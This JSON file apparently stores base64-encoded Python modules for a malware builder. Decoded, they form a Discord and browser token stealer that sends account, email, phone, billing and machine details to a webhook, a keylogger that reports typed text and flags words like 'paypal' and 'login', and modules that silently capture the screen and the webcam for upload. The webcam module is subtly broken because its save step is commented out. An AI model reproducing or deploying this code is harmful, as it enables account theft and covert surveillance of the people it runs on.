{
    "tokenGrab": "aW1wb3J0IG9zCmZyb20gcmUgaW1wb3J0IGZpbmRhbGwKZnJvbSBqc29uIGltcG9ydCBsb2FkcywgZHVtcHMKZnJvbSBiYXNlNjQgaW1wb3J0IGI2NGRlY29kZQpmcm9tIHN1YnByb2Nlc3MgaW1wb3J0IFBvcGVuLCBQSVBFCmZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IFJlcXVlc3QsIHVybG9wZW4KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUKZnJvbSB0aHJlYWRpbmcgaW1wb3J0IFRocmVhZAppbXBvcnQgdGltZQpmcm9tIHN5cyBpbXBvcnQgYXJndgoKTE9DQUwgPSBvcy5nZXRlbnYoIkxPQ0FMQVBQREFUQSIpClJPQU1JTkcgPSBvcy5nZXRlbnYoIkFQUERBVEEiKQpQQVRIUyA9IHsKICAgICJEaXNjb3JkIiAgICAgICAgICAgOiBST0FNSU5HICsgIlxcRGlzY29yZCIsCiAgICAiRGlzY29yZCBDYW5hcnkiICAgIDogUk9BTUlORyArICJcXGRpc2NvcmRjYW5hcnkiLAogICAgIkRpc2NvcmQgUFRCIiAgICAgICA6IFJPQU1JTkcgKyAiXFxkaXNjb3JkcHRiIiwKICAgICJHb29nbGUgQ2hyb21lIiAgICAgOiBMT0NBTCArICJcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGFcXERlZmF1bHQiLAogICAgIk9wZXJhIiAgICAgICAgICAgICA6IFJPQU1JTkcgKyAiXFxPcGVyYSBTb2Z0d2FyZVxcT3BlcmEgU3RhYmxlIiwKICAgICJCcmF2ZSIgICAgICAgICAgICAgOiBMT0NBTCArICJcXEJyYXZlU29mdHdhcmVcXEJyYXZlLUJyb3dzZXJcXFVzZXIgRGF0YVxcRGVmYXVsdCIsCiAgICAiWWFuZGV4IiAgICAgICAgICAgIDogTE9DQUwgKyAiXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YVxcRGVmYXVsdCIKfQpkZWYgZ2V0aGVhZGVycyh0b2tlbj1Ob25lLCBjb250ZW50X3R5cGU9ImFwcGxpY2F0aW9uL2pzb24iKToKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkNvbnRlbnQtVHlwZSI6IGNvbnRlbnRfdHlwZSwKICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4xMSAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8yMy4wLjEyNzEuNjQgU2FmYXJpLzUzNy4xMSIKICAgIH0KICAgIGlmIHRva2VuOgogICAgICAgIGhlYWRlcnMudXBkYXRlKHsiQXV0aG9yaXphdGlvbiI6IHRva2VufSkKICAgIHJldHVybiBoZWFkZXJzCgpkZWYgZ2V0dXNlcmRhdGEodG9rZW4pOgogICAgdHJ5OgogICAgICAgIHJldHVybiBsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZSIsIGhlYWRlcnM9Z2V0aGVhZGVycyh0b2tlbikpKS5yZWFkKCkuZGVjb2RlKCkpCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwpkZWYgZ2V0dG9rZW5zKHBhdGgpOgogICAgcGF0aCArPSAiXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiIgogICAgdG9rZW5zID0gW10KICAgIGZvciBmaWxlX25hbWUgaW4gb3MubGlzdGRpcihwYXRoKToKICAgICAgICBpZiBub3QgZmlsZV9uYW1lLmVuZHN3aXRoKCIubG9nIikgYW5kIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoIi5sZGIiKToKICAgICAgICAgICAgY29udGludWUKICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZiJ7cGF0aH1cXHtmaWxlX25hbWV9IiwgZXJyb3JzPSJpZ25vcmUiKS5yZWFkbGluZXMoKSBpZiB4LnN0cmlwKCldOgogICAgICAgICAgICBmb3IgcmVnZXggaW4gKHIiW1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17Mjd9IiwgciJtZmFcLltcdy1dezg0fSIpOgogICAgICAgICAgICAgICAgZm9yIHRva2VuIGluIGZpbmRhbGwocmVnZXgsIGxpbmUpOgogICAgICAgICAgICAgICAgICAgIHRva2Vucy5hcHBlbmQodG9rZW4pCiAgICByZXR1cm4gdG9rZW5zCgpkZWYgZ2V0aXAoKToKICAgIGlwID0gIk5vbmUiCiAgICB0cnk6CiAgICAgICAgaXAgPSB1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vYXBpLmlwaWZ5Lm9yZyIpKS5yZWFkKCkuZGVjb2RlKCkuc3RyaXAoKQogICAgZXhjZXB0OgogICAgICAgIHBhc3MKICAgIHJldHVybiBpcApkZWYgZ2V0YXZhdGFyKHVpZCwgYWlkKToKICAgIHVybCA9IGYiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXZhdGFycy97dWlkfS97YWlkfS5naWYiCiAgICB0cnk6CiAgICAgICAgdXJsb3BlbihSZXF1ZXN0KHVybCkpCiAgICBleGNlcHQ6CiAgICAgICAgdXJsID0gdXJsWzotNF0KICAgIHJldHVybiB1cmwKZGVmIGhhc19wYXltZW50X21ldGhvZHModG9rZW4pOgogICAgdHJ5OgogICAgICAgIHJldHVybiBib29sKGxlbihsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZS9iaWxsaW5nL3BheW1lbnQtc291cmNlcyIsIGhlYWRlcnM9Z2V0aGVhZGVycyh0b2tlbikpKS5yZWFkKCkuZGVjb2RlKCkpKSA+IDApCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwoKZGVmIG1haW4oKToKICAgIAogICAgY2FjaGVfcGF0aCA9IFJPQU1JTkcgKyAiXFwuY2FjaGV+JCIKICAgIGVtYmVkcyA9IFtdCiAgICB3b3JraW5nID0gW10KICAgIGNoZWNrZWQgPSBbXQogICAgYWxyZWFkeV9jYWNoZWRfdG9rZW5zID0gW10KICAgIHdvcmtpbmdfaWRzID0gW10KICAgIGlwID0gZ2V0aXAoKQogICAgcGNfdXNlcm5hbWUgPSBvcy5nZXRlbnYoIlVzZXJOYW1lIikKICAgIHBjX25hbWUgPSBvcy5nZXRlbnYoIkNPTVBVVEVSTkFNRSIpCiAgICBvcy5nZXRlbnYoInVzZXJwcm9maWxlIikuc3BsaXQoIlxcIilbMl0KICAgIGZvciBwbGF0Zm9ybSwgcGF0aCBpbiBQQVRIUy5pdGVtcygpOgogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKToKICAgICAgICAgICAgY29udGludWUKICAgICAgICBmb3IgdG9rZW4gaW4gZ2V0dG9rZW5zKHBhdGgpOgogICAgICAgICAgICBpZiB0b2tlbiBpbiBjaGVja2VkOgogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgY2hlY2tlZC5hcHBlbmQodG9rZW4pCiAgICAgICAgICAgIHVpZCA9IE5vbmUKICAgICAgICAgICAgaWYgbm90IHRva2VuLnN0YXJ0c3dpdGgoIm1mYS4iKToKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICB1aWQgPSBiNjRkZWNvZGUodG9rZW4uc3BsaXQoIi4iKVswXS5lbmNvZGUoKSkuZGVjb2RlKCkKICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICBpZiBub3QgdWlkIG9yIHVpZCBpbiB3b3JraW5nX2lkczoKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICB1c2VyX2RhdGEgPSBnZXR1c2VyZGF0YSh0b2tlbikKICAgICAgICAgICAgaWYgbm90IHVzZXJfZGF0YToKICAgICAgICAgICAgICAgIGNvbnRpbnVlCgogICAgICAgICAgICB3b3JraW5nX2lkcy5hcHBlbmQodWlkKQogICAgICAgICAgICB3b3JraW5nLmFwcGVuZCh0b2tlbikKICAgICAgICAgICAgdXNlcm5hbWUgPSB1c2VyX2RhdGFbInVzZXJuYW1lIl0gKyAiIyIgKyBzdHIodXNlcl9kYXRhWyJkaXNjcmltaW5hdG9yIl0pCiAgICAgICAgICAgIHVzZXJfaWQgPSB1c2VyX2RhdGFbImlkIl0KICAgICAgICAgICAgYXZhdGFyX2lkID0gdXNlcl9kYXRhWyJhdmF0YXIiXQogICAgICAgICAgICBhdmF0YXJfdXJsID0gZ2V0YXZhdGFyKHVzZXJfaWQsIGF2YXRhcl9pZCkKICAgICAgICAgICAgZW1haWwgPSB1c2VyX2RhdGEuZ2V0KCJlbWFpbCIpCiAgICAgICAgICAgIHBob25lID0gdXNlcl9kYXRhLmdldCgicGhvbmUiKQogICAgICAgICAgICBuaXRybyA9IGJvb2wodXNlcl9kYXRhLmdldCgicHJlbWl1bV90eXBlIikpCiAgICAgICAgICAgIGJpbGxpbmcgPSBib29sKGhhc19wYXltZW50X21ldGhvZHModG9rZW4pKQoKICAgICAgICAgICAgZmljaGllcjUgPSBvcy5wYXRoLmJhc2VuYW1lKF9fZmlsZV9fKQogICAgICAgICAgICBUSElTX0ZPTERFUjUgPSBvcy5wYXRoLmRpcm5hbWUob3MucGF0aC5hYnNwYXRoKF9fZmlsZV9fKSkKCiAgICAgICAgICAgIGVtYmVkID0gewogICAgICAgICAgICAgICAgImNvbG9yIjogMHhGRjAwMDAsCiAgICAgICAgICAgICAgICAiZmllbGRzIjogWwogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiKipBY2NvdW50IEluZm8qKiIsCiAgICAgICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYnRW1haWw6IHtlbWFpbH1cblBob25lOiB7cGhvbmV9XG5OaXRybzoge25pdHJvfVxuQmlsbGluZyBJbmZvOiB7YmlsbGluZ30nLAogICAgICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICIqKlBDIEluZm8qKiIsCiAgICAgICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYnSVA6IHtpcH1cblVzZXJuYW1lOiB7cGNfdXNlcm5hbWV9XG5QQyBOYW1lOiB7cGNfbmFtZX1cblRva2VuIExvY2F0aW9uOiB7cGxhdGZvcm19JywKICAgICAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IFRydWUKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiKipUb2tlbioqIiwKICAgICAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogdG9rZW4sCiAgICAgICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBGYWxzZQogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICBdLAogICAgICAgICAgICAgICAgImF1dGhvciI6IHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6IGYie3VzZXJuYW1lfSAoe3VzZXJfaWR9KSIsCiAgICAgICAgICAgICAgICAgICAgImljb25fdXJsIjogYXZhdGFyX3VybAogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICAgICAgICAgInRleHQiOiAiRnVja2VkIEJ5IE1lIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVtYmVkcy5hcHBlbmQoZW1iZWQpCiAgICB3aXRoIG9wZW4oY2FjaGVfcGF0aCwgImEiKSBhcyBmaWxlOgogICAgICAgIGZvciB0b2tlbiBpbiBjaGVja2VkOgogICAgICAgICAgICBpZiBub3QgdG9rZW4gaW4gYWxyZWFkeV9jYWNoZWRfdG9rZW5zOgogICAgICAgICAgICAgICAgZmlsZS53cml0ZSh0b2tlbiArICJcbiIpCiAgICBpZiBsZW4od29ya2luZykgPT0gMDoKICAgICAgICB3b3JraW5nLmFwcGVuZCgnMTIzJykKICAgIHdlYmhvb2sgPSB7CiAgICAgICAgImNvbnRlbnQiOiAiIiwKICAgICAgICAiZW1iZWRzIjogZW1iZWRzLAogICAgICAgICJ1c2VybmFtZSI6ICJEaXNjb3JkIFRva2VuIEdyYWJiZXIiLAogICAgICAgICJhdmF0YXJfdXJsIjogImh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXNzZXRzLzVjY2FiZjYyMTA4ZDVhODA3NGRkZDk1YWYyMjExNzI3LnBuZyIKICAgIH0KCiAgICB1cmxvcGVuKFJlcXVlc3QoIkwhTmsxMjMiLCBkYXRhPWR1bXBzKHdlYmhvb2spLmVuY29kZSgpLCBoZWFkZXJzPWdldGhlYWRlcnMoKSkpCgoKbWFpbigpCgo=",
    "keyLoggeur": "ZnJvbSBweW5wdXQua2V5Ym9hcmQgaW1wb3J0IExpc3RlbmVyCmZyb20gZGlzY29yZF93ZWJob29rIGltcG9ydCBEaXNjb3JkV2ViaG9vaywgRGlzY29yZEVtYmVkCmltcG9ydCBvcwppbXBvcnQgc2h1dGlsCmltcG9ydCBzeXMKaW1wb3J0IGdldHBhc3MKaW1wb3J0IGN0eXBlcwppbXBvcnQgcmVxdWVzdHMKZnJvbSBkaXNjb3JkIGltcG9ydCBXZWJob29rLCBSZXF1ZXN0c1dlYmhvb2tBZGFwdGVyCgp1c2VybmFtZSA9IGdldHBhc3MuZ2V0dXNlcigpCmhvb2sgPSAiTCFOazEyMyIKCmxldHRlciA9IChmInt1c2VybmFtZX0gPT4gIikKbnVtID0gMApkZWYgd3JpdGVmaWxlKGtleSk6CiAgICB0cnk6CiAgICAgICAgZ2xvYmFsIGxldHRlcgogICAgICAgIGdsb2JhbCBudW0KICAgICAgICBnbG9iYWwgdXNlcm5hbWUKCiAgICAgICAgaWYga2V5ID09ICJLZXkuc2hpZnQiOgogICAgICAgICAgICBrZXkgPSBrZXkudXBwZXIoKQogICAgICAgIGxldHRlciA9IChzdHIobGV0dGVyKSArIHN0cihrZXkpKQogICAgICAgIG51bSA9IG51bSArIDEKCiAgICAgICAgaWYgbnVtID09IDEwMDoKICAgICAgICAgICAgI21pc2UgZW4gcGFnZSBwYXMgZ2F5CiAgICAgICAgICAgIGxldHRlciA9IGxldHRlci5yZXBsYWNlKCdLZXkuc3BhY2UnLCAiICIpCiAgICAgICAgICAgIGxldHRlciA9IGxldHRlci5yZXBsYWNlKCInIiwgIiIpCiAgICAgICAgICAgIGxldHRlciA9IGxldHRlci5yZXBsYWNlKCdLZXkuZW50ZXInLCAiXG4iKSAgICAgICAgIAogICAgICAgICAgICBsZXR0ZXIgPSBsZXR0ZXIucmVwbGFjZSgnS2V5LnRhYicsICIgPFRhYj4gIikKICAgICAgICAgICAgbGV0dGVyID0gbGV0dGVyLnJlcGxhY2UoJ0tleS5jdHJsX2wnLCAiIDxDdHI+ICIpCiAgICAgICAgICAgIGxldHRlciA9IGxldHRlci5yZXBsYWNlKCdLZXkuYWx0XycsICIgPEFsdD4gIikKICAgICAgICAgICAgbGV0dGVyID0gbGV0dGVyLnJlcGxhY2UoJ0tleS5jbWQnLCAiIDxXaW4+ICIpCiAgICAgICAgICAgIGxldHRlciA9IGxldHRlci5yZXBsYWNlKCdLZXkuc2hpZnQnLCAiIikKICAgICAgICAgICAgIyBudW0gc3VyIGxlIGNvdGVyIGR1IGNsYXZpZXIKICAgICAgICAgICAgbGV0dGVyID0gbGV0dGVyLnJlcGxhY2UoJzw5Nj4nLCAiMCIpCiAgICAgICAgICAgIGxldHRlciA9IGxldHRlci5yZXBsYWNlKCc8OTc+JywgIjEiKQogICAgICAgICAgICBsZXR0ZXIgPSBsZXR0ZXIucmVwbGFjZSgnPDk4PicsICIyIikKICAgICAgICAgICAgbGV0dGVyID0gbGV0dGVyLnJlcGxhY2UoJzw5OT4nLCAiMyIpCiAgICAgICAgICAgIGxldHRlciA9IGxldHRlci5yZXBsYWNlKCc8MTAwPicsICI0IikKICAgICAgICAgICAgbGV0dGVyID0gbGV0dGVyLnJlcGxhY2UoJzwxMDE+JywgIjUiKQogICAgICAgICAgICBsZXR0ZXIgPSBsZXR0ZXIucmVwbGFjZSgnPDEwMj4nLCAiNiIpCiAgICAgICAgICAgIGxldHRlciA9IGxldHRlci5yZXBsYWNlKCc8MTAzPicsICI3IikKICAgICAgICAgICAgbGV0dGVyID0gbGV0dGVyLnJlcGxhY2UoJzwxMDQ+JywgIjgiKQogICAgICAgICAgICBsZXR0ZXIgPSBsZXR0ZXIucmVwbGFjZSgnPDEwNT4nLCAiOSIpCiAgICAgICAgICAgICNrZXl3b3JkcwogICAgICAgICAgICBrZXlfd29yZHMgPSBbInBheXBhbCIsICJpbnN0YWdyYW0iLCAiZm9ydG5pdGUiLCAidHdpdHRlciIsICJvcmlnaW4iLCAibmlrZSIsICJhZGlkYXMiLCAicm1jIHNwb3J0IiwgInJvYmxveCIsICJmb290bG9ja2VyIiwgImxvZ2luIiwgInJlZ2lzdGVyIiwgIkAiXQogICAgICAgICAgICBmb3Igd29yZHMgaW4ga2V5X3dvcmRzOgogICAgICAgICAgICAgICAgaWYgd29yZHMgaW4gbGV0dGVyOgogICAgICAgICAgICAgICAgICAgIGxldHRlciA9IChzdHIobGV0dGVyKSArICJcbkBldmVyeW9uZSwga2V5X3dvcmQgZGV0ZWN0ZWQiKQogICAgICAgICAgICB3ZWJob29rID0gRGlzY29yZFdlYmhvb2sodXJsPWhvb2ssIGNvbnRlbnQ9bGV0dGVyKQogICAgICAgICAgICB3ZWJob29rLmV4ZWN1dGUoKQogICAgICAgICAgICBsZXR0ZXIgPSAoZiJ7dXNlcm5hbWV9ID0+ICIpCiAgICAgICAgICAgIG51bSA9IDAKICAgIGV4Y2VwdCBLZXlFcnJvcjoKICAgICAgICBwYXNzCndpdGggTGlzdGVuZXIob25fcHJlc3M9d3JpdGVmaWxlKSBhcyBsaXM6CiAgICBsaXMuam9pbigpCgo=",
    "key_stealer": "None",
    "screenshot": "aW1wb3J0IHB5c2NyZWVuc2hvdCBhcyBJbWFnZUdyYWIKZnJvbSBkaG9va3MgaW1wb3J0IFdlYmhvb2ssIEZpbGUKaW1wb3J0IG9zCmltcG9ydCBnZXRwYXNzCmltcG9ydCBjdHlwZXMKCmN0eXBlcy53aW5kbGwua2VybmVsMzIuRnJlZUNvbnNvbGUoKQoKIyB0YWtlIGltYWdlIC0+IHNhdmUgaXQgdG8gcm9vdCBwYXRoIC0+IHNlbmQgaW1hZ2UgLT4gZGVsIGltYWdlCnVzZXIgPSBnZXRwYXNzLmdldHVzZXIoKQpwYXRoX2ltZyA9IGYnJydDOi9Vc2Vycy97dXNlcn0vc2NyZWVuLnBuZycnJwoKaW0gPSBJbWFnZUdyYWIuZ3JhYigpCmltLnNhdmUocGF0aF9pbWcpCmhvb2sgPSAiTCFOazEyMyIKaG9vazEgPSBXZWJob29rKGhvb2spCmZpbGUgPSBGaWxlKHBhdGhfaW1nKQpob29rMS5zZW5kKGZpbGU9ZmlsZSkK",
    "webcam": "aW1wb3J0IGN2Mgpmcm9tIGRob29rcyBpbXBvcnQgV2ViaG9vaywgRmlsZQppbXBvcnQgb3MKaW1wb3J0IGdldHBhc3MKIyB0YWtlIGltYWdlIC0+IHNhdmUgaXQgdG8gcm9vdCBwYXRoIC0+IHNlbmQgaW1hZ2UgLT4gZGVsIGltYWdlCnVzZXIgPSBnZXRwYXNzLmdldHVzZXIoKQpwYXRoX2ltZyA9IGYnJydDOi9Vc2Vycy97dXNlcn0vd2ViY2FtLmpwZycnJwojIHRha2UgaW1nCnZpZGVvID0gY3YyLlZpZGVvQ2FwdHVyZSgwKSAKY2hlY2ssIGZyYW1lID0gdmlkZW8ucmVhZCgpCiNjdjIuaW1zaG93KCJDYXB0dXJpbmciLGZyYW1lKQojc2hvd1BpYyA9IGN2Mi5pbXdyaXRlKHBhdGhfaW1nLGZyYW1lKQp2aWRlby5yZWxlYXNlKCkKY3YyLmRlc3Ryb3lBbGxXaW5kb3dzCiMgc2VuZCBvbiB3ZWJob29rCmhvb2sgPSAiTCFOazEyMyIKaG9vazEgPSBXZWJob29rKGhvb2spCmZpbGUgPSBGaWxlKHBhdGhfaW1nKQpob29rMS5zZW5kKGZpbGU9ZmlsZSk="
}